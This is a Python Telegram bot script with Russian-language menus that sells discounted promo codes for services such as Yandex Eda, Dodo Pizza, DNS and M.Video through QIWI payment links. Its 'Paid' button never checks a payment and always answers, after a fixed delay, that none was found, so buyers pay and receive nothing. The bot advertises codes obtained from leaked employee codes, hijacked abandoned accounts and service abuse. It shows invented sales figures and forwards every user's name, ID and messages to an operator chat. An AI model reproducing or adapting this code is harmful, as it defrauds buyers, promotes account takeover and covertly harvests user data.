import telebot
import configure
import time
from telebot import types


bot = telebot.TeleBot(configure.config['token'])
keyboard1 = telebot.types.ReplyKeyboardMarkup(True)
keyboard1.row('📕 Информация', '👤 Мой профиль')
keyboard1.row('🔥 Каталог')
keyboard2 = telebot.types.ReplyKeyboardMarkup(True, True)
keyboard2.row('🍕 Сервисы доставки еды', '💻 Магазины эллектроники')
keyboard2.row('В главное меню ⬅️')
keyboard3 = telebot.types.ReplyKeyboardMarkup(True, True)
keyboard3.row('Яндекс Еда 🍔', 'Самокат 🛴')
keyboard3.row('Додо Пица 🍕')
keyboard3.row('Выбрать другую категорию ⬅️')
keyboard4 = telebot.types.ReplyKeyboardMarkup(True, True)
keyboard4.row('Ситилинк 📙', 'DNS ⌚️')
keyboard4.row('Мвидео ☎️')
keyboard4.row('Выбрать другую категорию ⬅️')
keyboard5 = telebot.types.ReplyKeyboardMarkup(True, True)
keyboard5.row('Промокод на 500 рублей💰')
keyboard5.row('Промокод на 750 рублей💰')
keyboard5.row('Промокод на 1000 рублей💰')
keyboard5.row('Промокод на 1500 рублей💸')
keyboard5.row('Промокод на 2000 рублей💸')
keyboard5.row('Промокод на 2500 рублей💸')
keyboard5.row('Промокод на 3000 рублей💳')
keyboard5.row('Промокод на 3500 рублей💳')
keyboard5.row('Промокод на 4000 рублей💳')
keyboard5.row('Промокод на 4500 рублей💠')
keyboard5.row('Промокод на 5000 рублей💠')
keyboard5.row('Выбрать другую категорию ⬅️')
keyboard6 = types.InlineKeyboardMarkup(row_width=2)
item1 = types.InlineKeyboardButton('Оплатил 💸', callback_data='long')
item2 = types.InlineKeyboardButton('Назад ⬅️', callback_data='back')
keyboard6.add(item1, item2)
keyboard7 = telebot.types.ReplyKeyboardMarkup(True, True)
keyboard7.row('В главное меню ⬅️')

def log(message):
    from datetime import datetime
    
    send2 = "Сообщение от {0} {1} (id = {2}) \n {3}".format(message.from_user.first_name,
                                                              message.from_user.last_name,
                                                              str(message.from_user.id), message.text)
    
    bot.send_message(configure.chatId, text=send2)
@bot.message_handler(commands=['start'])
def start_message(message):
    log(message)
    name = message.from_user.first_name
    bot.send_sticker(message.chat.id, 'CAACAgIAAxkBAAJLTF-kZZBKxDr2f6DYPhImPKOteTeJAAI-BwACRvusBK9cOl7BGYj2HgQ')
    bot.send_message(message.chat.id, 'Привет, ' + str(name) +'✋',reply_markup=keyboard1)



@bot.message_handler(content_types=['text'])
def send_text(message):
    if message.text.lower() == '📕 информация':
        log(message)
        bot.send_message(message.chat.id, 'Администратор: @' + str(configure.administ) + '\n👁Пользователей: 1870\n🤩Продано кодов: 1096\n📅Дата запуска: 14.10.2020\n\nТак как мы дорожим доверием наших клиентов, мы рассказываем, как мы получаем промокоды, чтобы быть максимально прозрачным\n\n1 У нас есть отдельный бот в который сотрудники компаний за деньги сливают служебные коды🎁\n\n2 Мы получаем доступ к заброшенным аккаунтам сервисов и перегоняет баллы на наши аккаунты(так как по закону промокоды не являются имуществом это законно)🎁\n\n3 Мы абузим сервисы с помощью разных схем, которые мы либо покупаем у сотрудников или придумываем свои🎁')
    if message.text.lower() == '👤 мой профиль':
        log(message)
        cid = message.from_user.id
        name = message.from_user.first_name
        bot.send_message(message.chat.id, '👤 Ваше имя: '+ str(name) +'\n🆔 Ваш id: ' + str(cid) +'\n💰 Покупок совершенно: 0 \n🎁 Рефералов: 0\n\nРеферальная система 🖤\n\n🌈 https://t.me/' + str(configure.config['botName']) +'?start=r_' + str(cid) + '\n\nЗа каждого привеленного друга,\nТы получишь cashback 50 рублей 🦄' )
    if message.text.lower() == '🔥 каталог':
        log(message)
        bot.send_message(message.chat.id, 'Выбери категорию 🛒', reply_markup=keyboard2)
    if message.text.lower() == '🍕 сервисы доставки еды':
        log(message)
        bot.send_message(message.chat.id, 'Отличный выбор 🌭', reply_markup=keyboard3)
    if message.text.lower() == '💻 магазины эллектроники':
        log(message)
        bot.send_message(message.chat.id, 'Отличный выбор 📱', reply_markup=keyboard4)
    if message.text.lower() == 'в главное меню ⬅️':
        log(message)
        bot.send_message(message.chat.id, 'Выбери пункт из списка 🍪', reply_markup=keyboard1)
    if message.text.lower() == 'выбрать другую категорию ⬅️':
        log(message)
        bot.send_message(message.chat.id, 'Выбери категорию 🛒', reply_markup=keyboard2)
    if message.text.lower() == 'яндекс еда 🍔' :
        log(message)
        bot.send_message(message.chat.id, 'Выбери номинал для промокода Яндекс Еды 🍔', reply_markup=keyboard5)
        configure.prodname = 'Яндекс Еда 🍔'
    if message.text.lower() == 'самокат 🛴' :
        log(message)
        bot.send_message(message.chat.id, 'Выбери номинал для промокода самокат 🛴', reply_markup=keyboard5)
        configure.prodname = 'Самокат 🛴'
    if message.text.lower() == 'додо пица 🍕' :
        log(message)
        bot.send_message(message.chat.id, 'Выбери номинал для промокода Додо Пица 🍕', reply_markup=keyboard5)
        configure.prodname = 'Додо Пица 🍕'
    if message.text.lower() == 'ситилинк 📙' :
        log(message)
        bot.send_message(message.chat.id, 'Выбери номинал для промокода Ситилинк 📙', reply_markup=keyboard5)
        configure.prodname = 'Ситилинк 📙'
    if message.text.lower() == 'dns ⌚️' :
        log(message)
        bot.send_message(message.chat.id, 'Выбери номинал для промокода DNS ⌚️', reply_markup=keyboard5)
        configure.prodname = 'DNS ⌚️'
    if message.text.lower() == 'мвидео ☎️' :
        log(message)
        configure.prodname = 'Мвидео ☎️'
        bot.send_message(message.chat.id, 'Выбери номинал для промокода Мвидео ☎️', reply_markup=keyboard5)
    if message.text.lower() == 'промокод на 500 рублей💰' :
        log(message)
        bot.send_message(message.chat.id, 'Вы выбрали промокод на 500 рублей\nВ сервисе ' + str(configure.prodname) +'\nПосле оплаты бот пришлет вам баллы в виде qr кода💣\nИли специального купона🎫\n\nСумма к оплате 299 рублей💰 + комиссия\nДля удобной оплаты перейдите по ссылке🥝\nhttps://oplata.qiwi.com/form?invoiceUid=35f351f8-7e0a-49e1-a78d-4c5d059f559f\nПосле оплаты нажмите на кнопку Оплатил 💸\n', reply_markup=keyboard6)
    if message.text.lower() == 'промокод на 750 рублей💰' :
        log(message)
        bot.send_message(message.chat.id, 'Вы выбрали промокод на 750 рублей\nВ сервисе ' + str(configure.prodname) +'\nПосле оплаты бот пришлет вам баллы в виде qr кода💣\nИли специального купона🎫\n\nСумма к оплате 350 рублей💰 + комиссия\nДля удобной оплаты перейдите по ссылке🥝\nhttps://oplata.qiwi.com/form?invoiceUid=4d01ea2b-1b88-4277-a21b-526c4a528af0\nПосле оплаты нажмите на кнопку Оплатил 💸\n', reply_markup=keyboard6)
    if message.text.lower() == 'промокод на 1000 рублей💰' :
        log(message)
        bot.send_message(message.chat.id, 'Вы выбрали промокод на 1000 рублей\nВ сервисе ' + str(configure.prodname) +'\nПосле оплаты бот пришлет вам баллы в виде qr кода💣\nИли специального купона🎫\n\nСумма к оплате 499 рублей💰 + комиссия\nДля удобной оплаты перейдите по ссылке🥝\nhttps://oplata.qiwi.com/form?invoiceUid=f6306d61-453a-457a-a2ce-a8f281e6467f\nПосле оплаты нажмите на кнопку Оплатил 💸\n', reply_markup=keyboard6)
    if message.text.lower() == 'промокод на 1500 рублей💸' :
        log(message)
        bot.send_message(message.chat.id, 'Вы выбрали промокод на 1500 рублей\nВ сервисе ' + str(configure.prodname) +'\nПосле оплаты бот пришлет вам баллы в виде qr кода💣\nИли специального купона🎫\n\nСумма к оплате 749 рублей💰 + комиссия\nДля удобной оплаты перейдите по ссылке🥝\nhttps://oplata.qiwi.com/form?invoiceUid=ca70b73f-01d0-4b9d-962b-0c89e57a65cf\nПосле оплаты нажмите на кнопку Оплатил 💸\n', reply_markup=keyboard6)
    if message.text.lower() == 'промокод на 2000 рублей💸' :
        log(message)
        bot.send_message(message.chat.id, 'Вы выбрали промокод на 2000 рублей\nВ сервисе ' + str(configure.prodname) +'\nПосле оплаты бот пришлет вам баллы в виде qr кода💣\nИли специального купона🎫\n\nСумма к оплате 999 рублей💰 + комиссия\nДля удобной оплаты перейдите по ссылке🥝\nhttps://oplata.qiwi.com/form?invoiceUid=3d4357d3-d0d7-48ca-89f4-02581d40959b\nПосле оплаты нажмите на кнопку Оплатил 💸\n', reply_markup=keyboard6)
    if message.text.lower() == 'промокод на 2500 рублей💸' :
        log(message)
        bot.send_message(message.chat.id, 'Вы выбрали промокод на 2500 рублей\nВ сервисе ' + str(configure.prodname) +'\nПосле оплаты бот пришлет вам баллы в виде qr кода💣\nИли специального купона🎫\n\nСумма к оплате 1199 рублей💰 + комиссия\nДля удобной оплаты перейдите по ссылке🥝\nhttps://oplata.qiwi.com/form?invoiceUid=20708d11-ad0a-4ae4-9707-505f92f78c33\nПосле оплаты нажмите на кнопку Оплатил 💸\n', reply_markup=keyboard6)
    if message.text.lower() == 'промокод на 3000 рублей💳' :
        log(message)
        bot.send_message(message.chat.id, 'Вы выбрали промокод на 3000 рублей\nВ сервисе ' + str(configure.prodname) +'\nПосле оплаты бот пришлет вам баллы в виде qr кода💣\nИли специального купона🎫\n\nСумма к оплате 1499 рублей💰 + комиссия\nДля удобной оплаты перейдите по ссылке🥝\nhttps://oplata.qiwi.com/form?invoiceUid=e422797a-65fe-4039-93e4-dcc23a448fa3\nПосле оплаты нажмите на кнопку Оплатил 💸\n', reply_markup=keyboard6)
    if message.text.lower() == 'промокод на 3500 рублей💳' :
        log(message)
        bot.send_message(message.chat.id, 'Вы выбрали промокод на 3500 рублей\nВ сервисе ' + str(configure.prodname) +'\nПосле оплаты бот пришлет вам баллы в виде qr кода💣\nИли специального купона🎫\n\nСумма к оплате 1799 рублей💰 + комиссия\nДля удобной оплаты перейдите по ссылке🥝\nhttps://oplata.qiwi.com/form?invoiceUid=0691e896-d5b4-4ce1-84cf-0888a74bd12a\nПосле оплаты нажмите на кнопку Оплатил 💸\n', reply_markup=keyboard6)
    if message.text.lower() == 'промокод на 4000 рублей💳' :
        log(message)
        bot.send_message(message.chat.id, 'Вы выбрали промокод на 4000 рублей\nВ сервисе ' + str(configure.prodname) +'\nПосле оплаты бот пришлет вам баллы в виде qr кода💣\nИли специального купона🎫\n\nСумма к оплате 1999 рублей💰 + комиссия\nДля удобной оплаты перейдите по ссылке🥝\nhttps://oplata.qiwi.com/form?invoiceUid=998e8492-cba1-46b0-bccf-369a398a34c8\nПосле оплаты нажмите на кнопку Оплатил 💸\n', reply_markup=keyboard6)
    if message.text.lower() == 'промокод на 4500 рублей💠' :
        log(message)
        bot.send_message(message.chat.id, 'Вы выбрали промокод на 4500 рублей\nВ сервисе ' + str(configure.prodname) +'\nПосле оплаты бот пришлет вам баллы в виде qr кода💣\nИли специального купона🎫\n\nСумма к оплате 2199 рублей💰 + комиссия\nДля удобной оплаты перейдите по ссылке🥝\nhttps://oplata.qiwi.com/form?invoiceUid=20f15edc-52c9-453e-85d6-b298564d7cc5\nПосле оплаты нажмите на кнопку Оплатил 💸\n', reply_markup=keyboard6)
    if message.text.lower() == 'промокод на 5000 рублей💠' :
        log(message)
        bot.send_message(message.chat.id, 'Вы выбрали промокод на 5000 рублей\nВ сервисе ' + str(configure.prodname) +'\nПосле оплаты бот пришлет вам баллы в виде qr кода💣\nИли специального купона🎫\n\nСумма к оплате 2450 рублей💰 + комиссия\nДля удобной оплаты перейдите по ссылке🥝\nhttps://oplata.qiwi.com/form?invoiceUid=908d77f4-5f08-459d-ad6d-77d1af2ce411\nПосле оплаты нажмите на кнопку Оплатил 💸\n', reply_markup=keyboard6)
   

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
    
    try:
        
        if call.message: 
            if call.data == 'long':
                bot.send_message(configure.chatId, text='Пользователь Нажал на кнопку Оплатил 💸')
                bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id)
                time.sleep(2)
                bot.send_message(call.message.chat.id, 'Подождите, идет обработка платежа⚙')
                time.sleep(5)
                bot.send_message(call.message.chat.id, 'Платеж еще обрабатывается или не найден😭\nПопробуйте еще раз позже⌛', reply_markup=keyboard6)
                bot.send_sticker(call.message.chat.id, 'CAACAgIAAxkBAAJLXl-kZ3znk0jjtZz5WKT2P69wQoSrAAI9BwACRvusBERQD397YIAjHgQ')
            elif call.data == 'back':
                bot.send_message(configure.chatId, text='Пользователь Нажал на кнопку Назад ⬅️ ')
                bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id)
                bot.send_message(call.message.chat.id, 'Выбери категорию 🛒', reply_markup=keyboard2)
    except Exception as e:
        print(repr(e))
            
bot.polling(none_stop = True)


